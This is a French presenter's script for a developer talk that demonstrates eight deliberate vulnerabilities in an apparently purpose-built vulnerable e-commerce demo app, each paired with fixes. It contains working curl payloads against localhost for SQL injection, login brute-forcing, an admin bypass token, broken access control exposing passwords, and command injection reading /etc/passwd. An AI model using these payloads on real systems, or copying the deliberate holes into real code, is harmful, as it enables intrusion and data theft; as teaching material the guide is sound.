# 🎬 Guide de Présentation

**Durée: 50 minutes | Audience: Développeurs | Format: Live coding + Interface UI**

---

## Installation (Avant la présentation)

```bash
npm install
npm start
```

Accédez à http://localhost:3000

---

## Script de Présentation (50 min)

### INTRO (2 min)

"Vous allez voir une vraie application e-commerce. Elle a une interface, une authentification, une liste de produits. Le code a l'air normal. Mais..."

*Clic sur http://localhost:3000*

---

### FAILLE 0: SQL Injection (5 min)

**Contexte:**
"On a un endpoint pour consulter ses commandes. L'input `userId` est passé directement dans la requête SQL."

**Étape 1: Requête normale**
```bash
# Se connecter d'abord
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# Voir ses propres commandes
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1"
```

Résultat: 2 commandes pour userId=1

**Étape 2: Injection**
```bash
# Injection: 1 OR '1'='1'
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1%20OR%20'1'%3D'1'"
```

Résultat: **TOUTES** les commandes de tous les users! + la requête SQL exposée dans la réponse!

**Points:**
- "Concaténation directe = SQL injection"
- "En prod avec une vraie DB: lecture, modification, suppression de toute la base"
- "La réponse expose aussi la requête SQL construite (double faille!)"
- "Correction: utiliser des paramètres préparés (prepared statements)"

---

### FAILLE 1: Pas de Validation (2 min)

**Montrer la page register:**
- Montrer que n'importe quel email passe
- Pas d'erreur si email vide
- Pas d'erreur si password trop court

**Point:** "Pas de validation = porte ouverte"

---

### FAILLE 2: Plain Text Passwords (3 min)

**Test 1: Créer un compte**
```
- Register: test@test.com / password123
- Login avec le même compte
```

**Test 2: Montrer le code**
```bash
cat server.js | grep -A 5 "FAILLE 2"
```

**Point:** "Les passwords sont stockés en clair. Si quelqu'un leak la BD..."

---

### FAILLE 3: No Rate Limiting (3 min)

**Démonstration:**
```bash
for i in {1..10}; do
  echo "Attempt $i:"
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@sneakers.com","password":"try'$i'"}'
done
```

**Point:** 
- "Toutes les requêtes passent"
- "Pas d'erreur 429"
- "Pas de throttling"
- "Brute force possible en secondes"

---

### FAILLE 4: Admin Bypass Token (4 min)

**Montrer la faille:**
```bash
# Voir le token en .env
cat .env | grep ADMIN_TOKEN
# ADMIN_TOKEN=admin_token_12345

# L'utiliser pour bypasss le login
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'
```

**Résultat:**
```json
{"success": true, "message": "Admin access granted"}
```

**Point:**
- "Quelqu'un a mis ça pour 'tester' rapidement"
- "6 mois après... toujours là"
- "Escalade de privilèges directe"

---

### FAILLE 5: Unsafe Session Cookies (2 min)

**Montrer le code:**
```bash
cat server.js | grep -A 8 "cookie:"
```

**Points:**
- `secure: false` - Même sans HTTPS
- `httpOnly: false` - Accessible du JavaScript!

**Vérification en browser:**
1. Ouvrir http://localhost:3000/dashboard.html
2. Login avec user@sneakers.com / user123
3. Ouvrir Developer Tools → Console
4. Taper: `document.cookie`
5. Session ID visible!

**Point:** "Attacker peut le voler et le réutiliser"

---

### FAILLE 6: Information Disclosure (3 min)

**Test 1: User exists**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}'

# Retourne: "Wrong password"
# ↑ Aha! User existe!
```

**Test 2: User doesn't exist**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}'

# Retourne: "User not found"
```

**Point:**
- "Messages d'erreur trop spécifiques"
- "Énumération d'utilisateurs possible"
- "En prod, c'est grave"

---

### FAILLE 7: BFLA (Broken Function Level Access) (4 min)

**Setup:**
```bash
# 1. Login comme user normal
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}' \
  -c cookies.txt

# Note le success=true
```

**Test:**
```bash
# 2. Accéder au profil d'un autre user
curl -b cookies.txt http://localhost:3000/api/user/2

# Résultat:
# {
#   "id": 2,
#   "username": "admin",
#   "email": "admin@sneakers.com",
#   "password": "admin"   ← HACKED!
# }
```

**Question à l'audience:**
"Qui voit le problème? Je suis juste un user normal, connecté... mais je vois le password de l'admin!"

**Points:**
- "Authentification marche"
- "Mais pas d'autorisation"
- "Le dev a pensé: si authentifié, OK"
- "Oubli de vérifier: est-ce TON profil?"

---

### FAILLE 8: Command Injection (3 min)

**Test:**
```bash
# Recherche normale
curl "http://localhost:3000/api/shoes/search?q=Nike" \
  -b cookies.txt

# Command injection
curl "http://localhost:3000/api/shoes/search?q=Nike; touch /tmp/pwned; echo" \
  -b cookies.txt

# Vérifier si fichier créé
ls -la /tmp/pwned
# FILE CREATED!
```

**Montrer le code:**
```bash
cat server.js | grep -A 6 "shell: true"
```

**Points:**
- "Quelqu'un a pensé: 'Je vais logger les recherches'"
- "Pas d'échappement des paramètres"
- "`exec()` + `shell: true` = RCE"

**Plus dangereux:**
```bash
# Lire /etc/passwd
curl "http://localhost:3000/api/shoes/search?q=test; cat /etc/passwd > /tmp/result.txt; echo" \
  -b cookies.txt

cat /tmp/result.txt
```

---

### CONFIG ENDPOINT (1 min)

**Bonus: Secrets exposés**
```bash
curl http://localhost:3000/api/config
```

**Montre:**
- DEBUG: true
- SESSION_SECRET
- ADMIN_TOKEN
- API_KEY
- Tout!

---

### CONCLUSION (3 min)

**Récapitulatif:**

"Vous avez vu 8 failles. Elles ressemblent à du vrai code. Parce que c'EN EST. 

Les points clés:

1. **Validation** - Toujours valider les inputs
2. **Authentification vs Autorisation** - C'est DEUX choses
3. **Passwords** - Jamais en clair
4. **Rate limiting** - Sur les endpoints sensibles
5. **Information Disclosure** - Pas de détails dans les erreurs
6. **Pas de backdoors** - Pas d'admin tokens 'temporaires'
7. **Cookies sûrs** - httpOnly=true, secure=true
8. **Exec** - Jamais avec user input

Le message: **La sécurité c'est pas une feature, c'est un processus.**"

---

## 🎤 Tips d'Animation

1. **Montrer en direct l'interface**
   - Les devs voient le vrai code, ça les impressionne

2. **Poser des questions:**
   - "Qui a oublié de vérifier l'autorisation?"
   - "Qui a mis un token temporaire?" 
   - "Qui a mis un shell=true?"

3. **Être complice:**
   - "C'est normal, on l'a tous fait"
   - Pas de jugement

4. **Timing:**
   - Avoir une démo clé en main
   - Ne pas s'éterniser sur une faille
   - 2-4 min par faille max

---

## 📊 Timing Strict

| Partie | Temps | Cumul |
|--------|-------|-------|
| Intro | 2 min | 2 |
| Faille 1 | 2 min | 4 |
| Faille 2 | 3 min | 7 |
| Faille 3 | 3 min | 10 |
| Faille 4 | 4 min | 14 |
| Faille 5 | 2 min | 16 |
| Faille 6 | 3 min | 19 |
| Faille 7 | 4 min | 23 |
| Faille 8 | 3 min | 26 |
| Config | 1 min | 27 |
| Conclusion | 3 min | 30 |
| Q&A | 15 min | 45 |

---

## 🆘 Si Ça Casse

| Problème | Solution |
|----------|----------|
| Server ne démarre | `npm install` + `npm start` |
| Port occupé | `PORT=3001 npm start` |
| Page blanche | Ctrl+Shift+Delete cache |
| Cookie pas visible | Être sûr d'être loggin avant |
| Requête pas marche | Vérifier le cookie/session |

---

Bon courage! 🚀
